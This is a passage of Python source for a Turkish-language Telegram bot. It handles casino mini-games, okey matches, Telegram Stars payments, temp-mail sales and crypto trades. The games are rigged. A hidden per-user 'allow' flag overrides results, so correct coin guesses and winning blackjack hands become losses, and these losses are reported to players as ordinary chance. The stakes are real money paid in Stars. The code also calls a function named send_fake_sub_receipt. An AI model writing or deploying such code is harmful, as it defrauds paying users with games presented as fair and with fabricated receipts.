    bot.send_message(chat_id, f"❌ Max bahis: **{MAX_GAMBLE_BET:.0f} TL**", parse_mode="Markdown")
    return
  gbal = float(get_gamble_bal(user_id) or 0)
  if bet > gbal + 1e-9:
    bot.send_message(chat_id, f"❌ Yetersiz bakiye (**{gbal:.2f} TL**).", parse_mode="Markdown")
    return

  lines = 1
  extra = choice
  if game in ("slot", "olympus", "bonanza") and "|" in choice:
    parts = choice.split("|")
    try:
      lines = max(1, min(10, int(parts[0])))
    except Exception:
      lines = 1
    extra = parts[1] if len(parts) > 1 else ""
  elif game in ("slot", "olympus", "bonanza"):
    try:
      if choice.isdigit():
        lines = max(1, min(10, int(choice)))
    except Exception:
      lines = 1

  total_bet = bet * lines
  if total_bet > gbal + 1e-9:
    bot.send_message(chat_id, f"❌ Toplam bahis **{total_bet:.0f} TL** (bahis×satır). Yetersiz bakiye.", parse_mode="Markdown")
    return

  add_gamble_bal(user_id, -total_bet)
  try:
    add_to_jackpot(total_bet)
  except Exception:
    pass

  try:
    allow = bool(gamble_allow_win(user_id))
  except Exception:
    allow = random.random() < 0.18
  if game in ("slot", "olympus", "bonanza") and not allow and random.random() < 0.12:
    allow = True

  won = False
  mult = 0.0
  detail = ""
  ban_after = False

  if game in ("slot", "olympus", "bonanza"):
    r = random.random()
    if allow:
      if r < 0.002:  # %0.2
        mult = 1000.0
      elif r < 0.015:  # ~%1.3
        mult = 100.0
      elif r < 0.10:  # ~%8.5
        mult = 10.0
      elif r < 0.55:
        mult = random.choice([1.0, 1.2, 1.5, 2.0])
      else:
        mult = 0.0
    else:
      mult = 0.0
    if mult >= 1000:
      detail = f"{'🍬' if game=='bonanza' else '👑'} **1000x** · {lines} satır"
    elif mult >= 100:
      detail = f"{'🍬' if game=='bonanza' else '👑'} **100x** · {lines} satır"
    elif mult >= 10:
      detail = f"{'🍬' if game=='bonanza' else '👑'} **10x** · {lines} satır"
    elif mult > 0:
      detail = f"{'🍬' if game=='bonanza' else '👑'} **{mult:g}x** · {lines} satır"
    else:
      detail = f"{'🍬' if game=='bonanza' else '👑'} Eşleşme yok · {lines} satır"
    won = mult > 0
    if won:
      win_amt = bet * lines * mult
      add_gamble_bal(user_id, win_amt)
      try:
        update_gambling_profit(user_id, win_amt - total_bet)
      except Exception:
        pass
      save_data()
      bot.send_message(
        chat_id,
        f"✅ **+{win_amt:.2f} TL**\n{detail}\n"
        f"Bahis: {bet:g}×{lines} = {total_bet:g}\n"
        f"🎲 **{get_gamble_bal(user_id):.2f} TL**",
        parse_mode="Markdown",
      )
      try:
        log_activity("casino_v2", user_id, f"{game}:{total_bet}:W:{mult}")
      except Exception:
        pass
      return
    else:
      try:
        update_gambling_profit(user_id, -total_bet)
      except Exception:
        pass
      save_data()
      bot.send_message(
        chat_id,
        f"❌ **-{total_bet:.0f} TL**\n{detail}\n🎲 **{get_gamble_bal(user_id):.2f} TL**",
        parse_mode="Markdown",
      )
      try:
        log_activity("casino_v2", user_id, f"{game}:{total_bet}:L")
      except Exception:
        pass
      return

  elif game == "zeplin":
    try:
      cash = float(extra) if extra else 0
    except Exception:
      cash = 0
    crash = round(random.uniform(1.01, 3.5), 2)
    if not allow:
      crash = round(random.uniform(1.01, 1.4), 2)
    if cash >= 1.01 and cash < crash and allow:
      mult, won = cash, True
      detail = f"🚀 {cash}x · patlama {crash}x"
    else:
      detail = f"🚀 Patladı {crash}x"
      won = False

  elif game == "mines":
    if extra == "hit" or not allow:
      detail, won = "💣 Mayın", False
    else:
      try:
        steps = max(1, min(5, int(extra or "1")))
      except Exception:
        steps = 1
      mult = round(1.0 + steps * 0.35, 2)
      won = bool(allow)
      detail = f"💎 {steps} kutu · x{mult}" if won else "💣 Mayın"

  elif game == "coin":
    face = random.choice(["yazi", "tura"])
    detail = "Yazı" if face == "yazi" else "Tura"
    won = bool(allow and extra == face)
    mult = 1.85 if won else 0

  elif game == "dice":
    roll = random.randint(1, 6)
    detail = f"Zar {roll}"
    if extra == "low":
      fair, mult = roll <= 3, 1.85
    elif extra == "high":
      fair, mult = roll >= 4, 1.85
    elif extra in ("six", "exact_6"):
      fair, mult = roll == 6, 4.5
    else:
      fair, mult = False, 0
    won = bool(fair and allow)

  elif game == "tkm":
    opts = ["tas", "kagit", "makas"]
    bot_c = random.choice(opts)
    names = {"tas": "Taş", "kagit": "Kağıt", "makas": "Makas"}
    detail = f"{names.get(extra,'?')} vs {names.get(bot_c,'?')}"
    beats = {"tas": "makas", "kagit": "tas", "makas": "kagit"}
    won = bool(allow and extra in beats and beats[extra] == bot_c)
    mult = 1.85 if won else 0

  elif game in ("roulette", "rulet", "rr"):
    chamber = random.randint(1, 6)
    detail = f"🔫 Fişek {chamber}/6"
    if chamber == 6:
      won = False
      ban_after = True
      detail += " · BOŞ DEĞİL"
    else:
      if allow:
        won, mult = True, 1.7
        detail += " · boş"
      else:
        won = False
        detail += " · kayıp"

  elif game == "blackjack":
    def draw():
      c = random.randint(1, 13)
      return min(c, 10) if c < 12 else 10  # J Q K = 10, A as 11 handled soft
    def hand():
      a, b = random.randint(1, 13), random.randint(1, 13)
      def v(x):
        if x == 1:
          return 11
        return 10 if x >= 11 else x
      t = v(a) + v(b)
      if t > 21 and (a == 1 or b == 1):
        t -= 10
      return t
    pt, dt = hand(), hand()
    while dt < 17:
      dt += random.randint(2, 10)
      if dt > 21:
        break
    detail = f"🃏 Sen {pt} · Kasa {dt}"
    if pt > 21:
      won = False
    elif dt > 21:
      won, mult = True, 2.0
    elif pt == 21 and pt > dt:
      won, mult = True, 2.2
    elif pt > dt:
      won, mult = True, 2.0
    elif pt == dt:
      add_gamble_bal(user_id, total_bet)
      save_data()
      bot.send_message(chat_id, f"🃏 **Berabere** — iade\n{detail}\n🎲 **{get_gamble_bal(user_id):.2f} TL**", parse_mode="Markdown")
      return
    else:
      won = False
    if not allow and won:
      won, mult = False, 0
      detail += " (kasa)"

  elif game in ("riddle", "bilmece"):
    if extra == "ok" and allow:
      won, mult = True, 2.0
      detail = "🧩 Doğru"
    elif extra == "ok" and not allow:
      won = False
      detail = "🧩 Yanlış (şans)"
    else:
      won = False
      detail = "🧩 Yanlış"

  else:
    add_gamble_bal(user_id, total_bet)
    bot.send_message(chat_id, "❌ Oyun yok.")
    return

  if won and mult > 0:
    win_amt = total_bet * mult
    add_gamble_bal(user_id, win_amt)
    try:
      update_gambling_profit(user_id, win_amt - total_bet)
    except Exception:
      pass
    save_data()
    bot.send_message(
      chat_id,
      f"✅ **+{win_amt:.2f} TL**\n{detail}\n🎲 **{get_gamble_bal(user_id):.2f} TL**",
      parse_mode="Markdown",
    )
  else:
    try:
      update_gambling_profit(user_id, -total_bet)
    except Exception:
      pass
    if ban_after and user_id not in admin_ids_set:
      temp_banned_users[int(user_id)] = time.time() + 86400
      try:
        save_data()
      except Exception:
        pass
      bot.send_message(
        chat_id,
        f"🔫 **Rus Ruleti — kaybettin**\n{detail}\n"
        f"❌ -{total_bet:.0f} TL\n"
        f"🚫 **1 gün ban**\n"
        f"🎲 **{get_gamble_bal(user_id):.2f} TL**",
        parse_mode="Markdown",
      )
    else:
      save_data()
      bot.send_message(
        chat_id,
        f"❌ **-{total_bet:.0f} TL**\n{detail}\n🎲 **{get_gamble_bal(user_id):.2f} TL**",
        parse_mode="Markdown",
      )
  try:
    log_activity("casino_v2", user_id, f"{game}:{total_bet}:{'W' if won else 'L'}")
  except Exception:
    pass

def okey_make_code():
  return "".join(random.choices(string.ascii_uppercase + string.digits, k=5))

def okey_finish_match(room_code, winner_id=None, draw=False):
  """Oda sonucunu isle, bakiyeleri guncelle."""
  room = okey_rooms.get(room_code) or {}
  p1, p2 = room.get("p1"), room.get("p2")
  bet = float(room.get("bet") or 0)
  if not p1 or not p2 or bet <= 0:
    okey_rooms.pop(room_code, None)
    return
  if draw:
    for uid in (p1, p2):
      try:
        add_gamble_bal(uid, bet)
        bot.send_message(uid, f"🀄 Berabere — bahis iade (**{bet:.0f}**)\n🎲 **{get_gamble_bal(uid):.2f} TL**", parse_mode="Markdown")
      except Exception:
        pass
  else:
    loser = p2 if winner_id == p1 else p1
    pot = bet * 2 * 0.95  # %5 komisyon
    try:
      add_gamble_bal(winner_id, pot)
      bot.send_message(winner_id, f"🀄 **Kazandın!** +{pot:.2f} TL\n🎲 **{get_gamble_bal(winner_id):.2f} TL**", parse_mode="Markdown")
      bot.send_message(loser, f"🀄 **Kaybettin** -{bet:.0f} TL\n🎲 **{get_gamble_bal(loser):.2f} TL**", parse_mode="Markdown")
      update_gambling_profit(winner_id, pot - bet)
      update_gambling_profit(loser, -bet)
    except Exception as e:
      log_error("okey_finish", e)
  okey_rooms.pop(room_code, None)
  save_data()

def okey_run_vs(p1, p2, bet, room_code):
  """Basit skor: iki oyuncuya random el, yuksek kazanir."""
  s1 = random.randint(40, 101)
  s2 = random.randint(40, 101)
  if abs(s1 - s2) < 3 and random.random() < 0.2:
    s1 = s2
  try:
    bot.send_message(p1, f"🀄 El: **{s1}** · Rakip: **{s2}**", parse_mode="Markdown")
    bot.send_message(p2, f"🀄 El: **{s2}** · Rakip: **{s1}**", parse_mode="Markdown")
  except Exception:
    pass
  if s1 == s2:
    okey_finish_match(room_code, draw=True)
  elif s1 > s2:
    okey_finish_match(room_code, winner_id=p1)
  else:
    okey_finish_match(room_code, winner_id=p2)

def process_okey_action(user_id, chat_id, data):
  """okey_match | okey_create | okey_join | okey_start"""
  action = (data.get("action") or "").strip()
  try:
    bet = float(data.get("bet") or 0)
  except Exception:
    bet = 0
  if action in ("okey_match", "okey_create", "okey_join") and bet <= 0:
    bot.send_message(chat_id, "❌ Bahis seç.")
    return
  if action in ("okey_match", "okey_create"):
    if bet > get_gamble_bal(user_id):
      bot.send_message(chat_id, f"❌ Yetersiz bakiye (**{get_gamble_bal(user_id):.2f}**).")
      return
    if MAX_GAMBLE_BET and bet > MAX_GAMBLE_BET and user_id not in admin_ids_set:
      bot.send_message(chat_id, f"❌ Max **{MAX_GAMBLE_BET:.0f}**")
      return

  if action == "okey_match":
    while user_id in okey_queue:
      okey_queue.remove(user_id)
    partner = None
    for i, uid in enumerate(list(okey_queue)):
      if uid != user_id:
        partner = uid
        okey_queue.pop(i)
        break
    if partner is None:
      okey_queue.append(user_id)
      admin_temp_data[user_id] = {"okey_bet": bet}
      bot.send_message(chat_id, f"🀄 **Oto eşleşme**\nBahis: **{bet:.0f} TL**\n⏳ Rakip aranıyor...")
      return
    bet2 = float((admin_temp_data.get(partner) or {}).get("okey_bet") or bet)
    use_bet = min(bet, bet2)
    if get_gamble_bal(user_id) < use_bet or get_gamble_bal(partner) < use_bet:
      bot.send_message(chat_id, "❌ Bakiye yetersiz (eşleşme iptal).")
      try:
        bot.send_message(partner, "❌ Eşleşme iptal (bakiye).")
      except Exception:
        pass
      return
    add_gamble_bal(user_id, -use_bet)
    add_gamble_bal(partner, -use_bet)
    code = okey_make_code()
    okey_rooms[code] = {"p1": partner, "p2": user_id, "bet": use_bet, "status": "play"}
    save_data()
    bot.send_message(chat_id, f"🀄 **Eşleşti!**\nRakip bulundu · Bahis **{use_bet:.0f}**\nEl dağıtılıyor...")
    try:
      bot.send_message(partner, f"🀄 **Eşleşti!**\nRakip bulundu · Bahis **{use_bet:.0f}**\nEl dağıtılıyor...")
    except Exception:
      pass
    okey_run_vs(partner, user_id, use_bet, code)
    return

  if action == "okey_create":
    code = okey_make_code()
    add_gamble_bal(user_id, -bet)
    okey_rooms[code] = {"p1": user_id, "p2": None, "bet": bet, "status": "wait"}
    save_data()
    bot.send_message(
      chat_id,
      f"🀄 **Oda kuruldu**\nKod: `{code}`\nBahis: **{bet:.0f} TL**\n\nArkadaşına kodu göndersin · o da Mini App’ten **Koda katıl**",
      parse_mode="Markdown",
    )
    return

  if action == "okey_join":
    code = (data.get("code") or data.get("choice") or "").strip().upper()
    room = okey_rooms.get(code)
    if not room or room.get("status") != "wait" or room.get("p2"):
      bot.send_message(chat_id, "❌ Oda yok / dolu / kod hatalı.")
      return
    if room.get("p1") == user_id:
      bot.send_message(chat_id, "❌ Kendi odan.")
      return
    bet = float(room.get("bet") or 0)
    if get_gamble_bal(user_id) < bet:
      bot.send_message(chat_id, "❌ Yetersiz bakiye.")
      return
    add_gamble_bal(user_id, -bet)
    room["p2"] = user_id
    room["status"] = "play"
    save_data()
    p1 = room["p1"]
    bot.send_message(chat_id, f"🀄 Odaya katıldın (`{code}`)\nEl dağıtılıyor...")
    try:
      bot.send_message(p1, f"🀄 Rakip katıldı!\nEl dağıtılıyor...")
    except Exception:
      pass
    okey_run_vs(p1, user_id, bet, code)
    return

  bot.send_message(chat_id, "❌ Okey komutu bilinmiyor.")

@bot.message_handler(content_types=["web_app_data"])
def process_web_app_data(message):
  try:
    user_id = message.from_user.id
    chat_id = message.chat.id
    raw = getattr(getattr(message, "web_app_data", None), "data", None) or ""
    data = json.loads(raw) if raw else {}
    act = (data.get("action") or "").strip()
    if act in ("okey_match", "okey_create", "okey_join"):
      process_okey_action(user_id, chat_id, data)
      return
    if act != "play":
      return
    print(f"[casino] web_app_data uid={user_id} raw={str(raw)[:120]}")
    process_casino_v2_play(
      user_id, chat_id,
      data.get("game"), data.get("bet"), data.get("choice") or "",
    )
    try:
      bot.send_message(
        chat_id,
        "🎰 Tekrar için butona bas:",
        reply_markup=casino_again_markup(user_id),
      )
    except Exception:
      pass
  except Exception as e:
    log_error("web_app_data", e)
    print(f"[casino] ERR {e}")
    try:
      bot.send_message(message.chat.id, f"⚠️ Casino: {e}")
    except Exception:
      pass

@bot.message_handler(func=lambda m: getattr(m, "web_app_data", None) is not None)
def process_web_app_data_alt(message):
  return process_web_app_data(message)

@bot.message_handler(content_types=['successful_payment'])
def process_successful_payment(message):
  try:
    payment = message.successful_payment
    user_id = message.from_user.id
    chat_id = message.chat.id
    payload = payment.invoice_payload or ""
    stars_paid = int(payment.total_amount)  # XTR amount = stars
    currency = payment.currency

    if currency != "XTR":
      bot.send_message(chat_id, "❌ Bu ödeme bu bot için geçerli değil.")
      return

    is_tempmail = payload.startswith("tempmail_")
    is_mybot = payload.startswith("mybot_")
    is_ilan = payload.startswith("ilanstar_")
    is_gamble = payload.startswith("stargamble_")
    is_chksub = payload.startswith("chksub_")
    is_starclaim = payload.startswith("starclaim_")
    is_normal = payload.startswith("star_") and not is_gamble and not is_ilan and not is_tempmail and not is_starclaim
    if not is_tempmail and not is_ilan and not is_gamble and not is_normal and not is_mybot and not is_chksub and not is_starclaim:
      bot.send_message(chat_id, "❌ Bu ödeme bu bot için geçerli değil.")
      return

    if is_starclaim:
      # starclaim_{uid}_{claimed_stars}_{ts} — kullanıcı 1⭐ ödedi, admin onayı bekler
      parts = payload.split("_")
      try:
        claimed = int(parts[2]) if len(parts) > 2 else 0
      except Exception:
        claimed = 0
      if claimed < STAR_MIN or claimed > STAR_MAX:
        bot.send_message(chat_id, "❌ Geçersiz talep miktarı.")
        return
      if stars_paid < 1:
        bot.send_message(chat_id, "❌ Onay ödemesi eksik (1⭐ gerekli).")
        return
      rate = float(STAR_ADMIN_CLAIM_RATE)
      tl_amount = round(float(claimed) * rate, 2)
      pay_id = str(uuid.uuid4())[:8]
      uname = message.from_user.username or "-"
      pending_star_payments[pay_id] = {
        "user_id": user_id,
        "username": uname,
        "amount_tl": tl_amount,
        "stars": claimed,
        "confirm_stars": stars_paid,
        "pkg_key": f"claim_{claimed}",
        "time": get_current_time_str(),
        "status": "pending",
        "payload": payload,
        "type": "admin_claim",
        "rate_per_star": float(STAR_ADMIN_CLAIM_RATE),
        "rate": rate,
      }
      save_data()
      log_activity("star_claim", user_id, f"claimed={claimed} tl={tl_amount} pay_id={pay_id}")
      bot.send_message(
        chat_id,
        f"✅ **1⭐ onay ödemesi alındı**\n\n"
        f"⭐ Talep: **{claimed} yıldız** → **{tl_amount:.0f} TL**\n"
        f"🆔 `{pay_id}`\n"
        f"⏳ Admin onayından sonra bakiyene eklenecek.\n"
        f"Alıcı kontrol: **{STAR_RECEIVER_USERNAME}**",
        parse_mode="Markdown",
      )
      admin_markup = types.InlineKeyboardMarkup(row_width=2)
      admin_markup.add(
        types.InlineKeyboardButton("✅ Onayla", callback_data=f"star_approve_{pay_id}"),
        types.InlineKeyboardButton("❌ Reddet", callback_data=f"star_reject_{pay_id}"),
      )
      admin_text = (
        f"👤 **YILDIZ — ADMİN ONAY TALEBİ**\n\n"
        f"🆔 `{pay_id}`\n"
        f"👤 `{user_id}` (@{uname})\n"
        f"⭐ İddia: **{claimed} yıldız** → **{STAR_RECEIVER_USERNAME}**\n"
        f"💱 Kur: 1⭐ = **{rate:.0f} TL**\n"
        f"💵 Talep: **+{tl_amount:.0f} TL**\n"
        f"✅ Onay ödemesi: **{stars_paid} ⭐** alındı\n"
        f"🕐 {get_current_time_str()}\n\n"
        f"Kontrol et → onayla veya reddet."
      )
      for admin_id in admin_ids_set:
        try:
          bot.send_message(admin_id, admin_text, reply_markup=admin_markup, parse_mode="Markdown")
        except Exception:
          pass
      try:
        if STAR_RECEIVER_ID and int(STAR_RECEIVER_ID) not in admin_ids_set:
          bot.send_message(int(STAR_RECEIVER_ID), admin_text, reply_markup=admin_markup, parse_mode="Markdown")
      except Exception:
        pass
      return

    if is_chksub:
      parts = payload.split("_")
      plan_key = parts[2] if len(parts) > 2 else ""
      mode = parts[3] if len(parts) > 4 else "self"
      if mode not in ("self", "gift"):
        mode = "self"
      plan = CHECKER_SUB_PLANS.get(plan_key)
      if not plan:
        bot.send_message(chat_id, "Gecersiz abonelik paketi.")
        return
      need = int(plan["stars"])
      if stars_paid < need:
        bot.send_message(chat_id, "Eksik odeme (%s/%s yildiz)." % (stars_paid, need))
        return
      if mode == "gift":
        _custom = None
        try:
          _custom = (admin_temp_data.get(chat_id) or {}).get("gift_custom")
        except Exception:
          pass
        code, title = create_premium_gift_code(user_id, plan_key, via="stars", custom_code=_custom)
        if not code:
          bot.send_message(chat_id, "Kod uretilemedi, admin ile iletisime gec.")
          return
        try:
          sub_purchase_log.append({
            "uid": user_id, "plan": plan_key, "via": "stars_gift",
            "tl": float(plan.get("tl") or 0), "stars": stars_paid,
            "ts": time.time(), "time_str": get_current_time_str(),
          })
          save_data()
        except Exception:
          pass
        try:
          notify_admins_checker_sub(user_id, plan_key, via="stars_gift")
        except Exception:
          pass
        try:
          send_fake_sub_receipt(chat_id, user_id, plan_key, float(plan["tl"]), method="Yildiz hediye", gift_code=code)
        except Exception:
          pass
        bot.send_message(chat_id, "ODEME BASARILI\n\nHediye kodun:\n%s\n\nPaket: %s\nTek kullanimlik." % (code, title))
        return
      if has_checker_sub(user_id):
        bot.send_message(chat_id, "Zaten aktif aboneligin var. Yildiz odemesi alindi; admin ile konus.")
        return
      ok, msg = grant_checker_sub(user_id, plan_key, via="stars")
      if ok:
        try:
          send_fake_sub_receipt(chat_id, user_id, plan_key, float(plan["tl"]), method="Yildiz (%s)" % stars_paid)
        except Exception:
          pass
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("Checker", callback_data="menu_checker"))
        bot.send_message(chat_id, "Abonelik acildi! %s yildiz\n\n%s" % (stars_paid, str(msg).replace("**", "")), reply_markup=markup)
      else:
        bot.send_message(chat_id, str(msg))
      return

    if is_mybot:
      parts = payload.split("_")
      try:
        need = int(parts[2]) if len(parts) > 2 else int(globals().get("MYBOT_STAR_COST", 50))
      except Exception:
        need = 50
      if stars_paid < need:
        bot.send_message(chat_id, f"❌ Eksik odeme ({stars_paid}/{need}⭐).")
        return
      info = user_bot_tokens.get(user_id) or {}
      info["paid"] = True
      info["paid_stars"] = stars_paid
      info["paid_at"] = time.time()
      user_bot_tokens[user_id] = info
      save_data()
      log_activity("mybot_paid", user_id, f"stars={stars_paid}")
      markup = types.InlineKeyboardMarkup()
      markup.add(types.InlineKeyboardButton("➕ Token ekle", callback_data="mybot_add_token"))
      markup.add(types.InlineKeyboardButton("🤖 Bot menu", callback_data="menu_my_bot"))
      bot.send_message(
        chat_id,
        f"✅ **Odeme OK — kendi bot hakki acildi**\n\n"
        f"⭐ {stars_paid} yildiz\n"
        f"Token ekleyip botunu baslatabilirsin.",
        reply_markup=markup,
        parse_mode="Markdown",
      )
      return

    if is_tempmail:
      ensure_user(user_id, username=message.from_user.username, first_name=message.from_user.first_name)
      if stars_paid < int(TEMPMAIL_STAR_COST):
        bot.send_message(chat_id, f"❌ Eksik ödeme (min {TEMPMAIL_STAR_COST}⭐).")
        return
      ok, res = tempmail_create()
      if not ok:
        bot.send_message(
          chat_id,
          f"⚠️ Ödeme alındı ama mail açılamadı: {res}\n"
          f"Admin ile iletişime geç — {stars_paid}⭐ kaydın var.",
          parse_mode="Markdown",
        )
        for admin_id in list(admin_ids_set):
          try:
            bot.send_message(
              admin_id,
              f"⚠️ Tempmail ödeme OK ama create fail\n"
              f"👤 `{user_id}` · ⭐{stars_paid}\n{res}",
              parse_mode="Markdown",
            )
          except Exception:
            pass
        log_activity("tempmail_pay_fail", user_id, str(res)[:80])
        return
      user_temp_mails[user_id] = {
        "address": res["address"],
        "password": res.get("password"),
        "token": res["token"],
        "created": time.time(),
      }
      save_data()
      log_activity("tempmail_new_paid", user_id, f"{res['address']}:{stars_paid}")
      bot.send_message(
        chat_id,
        f"✅ **Ödeme OK — yeni geçici mail**\n\n"
        f"⭐ Ödenen: **{stars_paid}**\n"
        f"📬 Adres:\n`{res['address']}`\n\n"
        f"💡 Kopyala, sitede kullan.\n"
        f"Kod gelince **Gelen Kutusu**.",
        reply_markup=tempmail_panel_markup(user_id),
        parse_mode="Markdown",
      )
      return

    if is_ilan:
      parts = payload.split("_")
      if len(parts) < 4:
        bot.send_message(chat_id, "❌ Geçersiz ilan ödeme verisi.")
        return
      l_id = parts[1]
      try:
        expected_stars = int(parts[3]) if len(parts) > 3 else stars_paid
      except Exception:
        expected_stars = stars_paid
      if stars_paid < 1:
        bot.send_message(chat_id, "❌ Eksik ödeme.")
        return
      ensure_user(user_id, username=message.from_user.username, first_name=message.from_user.first_name)
      process_ilan_star_payment(user_id, chat_id, l_id, stars_paid, payload)
      return

    parts = payload.split("_")
    if len(parts) < 4:
      bot.send_message(chat_id, "❌ Geçersiz ödeme verisi.")
      return
    try:
      expected_stars = int(parts[2])
    except Exception:
      bot.send_message(chat_id, "❌ Geçersiz yıldız miktarı.")
      return

    if stars_paid < expected_stars:
      bot.send_message(chat_id, f"❌ Eksik ödeme. Beklenen: {expected_stars}⭐, Gelen: {stars_paid}⭐")
      return

    pay_id = str(uuid.uuid4())[:8]
    uname = message.from_user.username or str(user_id)
    ensure_user(user_id, username=message.from_user.username, first_name=message.from_user.first_name)

    if is_gamble:
      gamble_amt = round(float(stars_paid) * float(STAR_GAMBLE_PER_STAR), 2)
      add_gamble_bal(user_id, gamble_amt)
      add_balance_history(user_id, "star_gamble_topup", gamble_amt, f"auto {stars_paid}⭐ {pay_id}")
      pending_star_payments[pay_id] = {
        "user_id": user_id,
        "username": uname,
        "amount_tl": 0.0,
        "amount_gamble": gamble_amt,
        "stars": stars_paid,
        "pkg_key": str(expected_stars),
        "time": get_current_time_str(),
        "status": "auto_approved_gamble",
        "payload": payload,
        "type": "gamble",
      }
      save_data()
      log_activity("star_gamble_auto", user_id, f"{gamble_amt}gamble/{stars_paid}⭐ pay_id={pay_id}")
      bot.send_message(
        chat_id,
        f"✅ **Ödeme başarılı — kumar bakiyesi eklendi!**\n\n"
        f"⭐ Ödenen: **{stars_paid} Yıldız**\n"
        f"🎲 Yüklenen: **+{gamble_amt:.0f}** kumar bakiyesi\n"
        f"💳 Kumar bakiyen: **{get_gamble_bal(user_id):.2f} TL**\n"
        f"🆔 `{pay_id}`\n\n"
        f"Kur: 100⭐ = 1000 kumar",
        parse_mode="Markdown",
      )
      try:
        add_notification(user_id, f"+{gamble_amt:.0f} kumar bakiyesi (yıldız)")
      except Exception:
        pass
      admin_text = (
        f"🎲 **YILDIZ → KUMAR (OTOMATİK)**\n\n"
        f"🆔 `{pay_id}`\n"
        f"👤 `{user_id}` (@{uname})\n"
        f"⭐ **{stars_paid}** yıldız\n"
        f"🎲 **+{gamble_amt:.0f}** kumar bakiyesi\n"
        f"💳 Kumar: **{get_gamble_bal(user_id):.2f} TL**\n"
        f"🕐 {get_current_time_str()}"
      )
    else:
      tl_amount = round(float(stars_paid) * float(STAR_TL_PER_STAR), 2)
      user_balances[user_id] = float(user_balances.get(user_id, 0.0)) + tl_amount
      add_balance_history(user_id, "star_topup", tl_amount, f"auto {stars_paid}⭐ {pay_id}")
      pending_star_payments[pay_id] = {
        "user_id": user_id,
        "username": uname,
        "amount_tl": tl_amount,
        "stars": stars_paid,
        "pkg_key": str(expected_stars),
        "time": get_current_time_str(),
        "status": "auto_approved",
        "payload": payload,
        "type": "balance",
      }
      save_data()
      log_activity("star_auto", user_id, f"{tl_amount}TL/{stars_paid}⭐ pay_id={pay_id}")
      bot.send_message(
        chat_id,
        f"✅ **Ödeme başarılı — bakiye eklendi!**\n\n"
        f"⭐ Ödenen: **{stars_paid} Yıldız**\n"
        f"💵 Yüklenen: **+{tl_amount:.2f} TL**\n"
        f"💳 Güncel bakiye: **{user_balances[user_id]:.2f} TL**\n"
        f"🆔 `{pay_id}`\n\n"
        f"Kur: 1⭐ = {STAR_TL_PER_STAR:.0f} TL",
        parse_mode="Markdown",
      )
      try:
        add_notification(user_id, f"+{tl_amount:.0f} TL yıldız yüklemesi (otomatik)")
      except Exception:
        pass
      admin_text = (
        f"⭐ **YILDIZ ÖDEME (OTOMATİK ONAY)**\n\n"
        f"🆔 `{pay_id}`\n"
        f"👤 `{user_id}` (@{uname})\n"
        f"⭐ **{stars_paid}** yıldız\n"
        f"💵 **+{tl_amount:.2f} TL** eklendi\n"
        f"💳 Bakiye: **{user_balances[user_id]:.2f} TL**\n"
        f"🕐 {get_current_time_str()}"
      )

    for admin_id in admin_ids_set:
      try:
        bot.send_message(admin_id, admin_text, parse_mode="Markdown")
      except Exception:
        pass
  except Exception as e:
    log_error("successful_payment", e)
    try:
      bot.send_message(message.chat.id, "❌ Ödeme işlenirken hata oluştu. Admin ile iletişime geçin.")
    except Exception:
      pass

@bot.message_handler(func=lambda message: message.chat.id in user_states or message.contact is not None, content_types=['text', 'photo', 'contact', 'document', 'audio', 'voice'])
def handle_user_input(message):
  chat_id = message.chat.id
  user_id = message.from_user.id
  username = f"@{message.from_user.username}" if message.from_user.username else str(user_id)

  if check_spam(user_id, chat_id, username): return
  if is_user_banned(user_id): return
  if is_maintenance_blocking(user_id):
    try:
      bot.send_message(chat_id, get_maintenance_block_text(), parse_mode="Markdown")
    except Exception:
      pass
    return

  state = user_states.get(chat_id)

  if state in ("waiting_smm_link", "waiting_smm_qty", "waiting_smm_confirm"):
    user_states.pop(chat_id, None)
    admin_temp_data.pop(chat_id, None)
    bot.send_message(chat_id, "❌ SMM paneli kaldırıldı.")
    return

  if state == "waiting_crypto_amount":
    raw = (message.text or "").strip().lower()
    if not raw:
      bot.send_message(chat_id, "TL miktarı yaz veya /iptal")
      return
    if raw in ("/iptal", "iptal", "/cancel", "cancel"):
      user_states.pop(chat_id, None)
      crypto_pending.pop(chat_id, None)
      bot.send_message(chat_id, "İptal.")
      return
    pend = crypto_pending.get(chat_id) or {}
    sym = pend.get("sym")
    side = pend.get("side")
    if not sym or side not in ("buy", "sell"):
      user_states.pop(chat_id, None)
      crypto_pending.pop(chat_id, None)
      bot.send_message(chat_id, "Oturum yok — borsadan tekrar Al/Sat seç.")
      return
    try:
      prices = fetch_crypto_prices()
    except Exception as e:
      bot.send_message(chat_id, f"Fiyat hatası: {e}")
      return
    pr = float(prices.get(sym) or 0)
    if pr <= 0:
      bot.send_message(chat_id, "Fiyat alınamadı, sonra dene.")
      return
    pf = stock_portfolio.setdefault(user_id, {})
    if side == "buy":
      try:
        tl = float(raw.replace(",", "."))
      except Exception:
        bot.send_message(chat_id, "Sayı yaz (ör. 15 veya 4.5)")
        return
      if tl < 1:
        bot.send_message(chat_id, "Min 1 TL.")
        return
      fee = tl * float(CRYPTO_FEE)
      need = tl + fee
      bal = get_norm_bal(user_id)
      if bal < need:
        bot.send_message(
          chat_id,
          f"❌ Yetersiz bakiye.\n"
          f"İstenen: **{tl:.2f}** + komisyon **{fee:.2f}** = **{need:.2f} TL**\n"
          f"Bakiyen: **{bal:.2f} TL**",
          parse_mode="Markdown",
        )
        return
      coin_amt = tl / pr
      set_norm_bal(user_id, bal - need)
      pf[sym] = float(pf.get(sym) or 0) + coin_amt
      save_data()
      user_states.pop(chat_id, None)
      crypto_pending.pop(chat_id, None)
      bot.send_message(
        chat_id,
        f"✅ **{coin_amt:.8f} {sym}** alındı\n"
        f"Ödenen: {tl:.2f} + kom. {fee:.2f} TL\n"
        f"💵 **{get_norm_bal(user_id):.2f} TL**",
        parse_mode="Markdown",
      )
      return
    have = float(pf.get(sym) or 0)
    if have <= 0:
      bot.send_message(chat_id, "Elinde bu coin yok.")
      user_states.pop(chat_id, None)
      crypto_pending.pop(chat_id, None)
      return
    if raw in ("all", "hepsi", "tümü", "tumu"):
      coin_amt = have
    else:
      try:
        tl = float(raw.replace(",", "."))
      except Exception:
        bot.send_message(chat_id, "TL yaz veya `all`")
        return
      coin_amt = min(have, tl / pr)
    if coin_amt <= 0:
      bot.send_message(chat_id, "Miktar geçersiz.")
      return
    gross = coin_amt * pr
    fee = gross * float(CRYPTO_FEE)
    net = gross - fee
    pf[sym] = have - coin_amt
    if pf[sym] < 1e-12:
      pf[sym] = 0.0
    set_norm_bal(user_id, get_norm_bal(user_id) + net)
    save_data()
    user_states.pop(chat_id, None)
    crypto_pending.pop(chat_id, None)
    bot.send_message(
      chat_id,
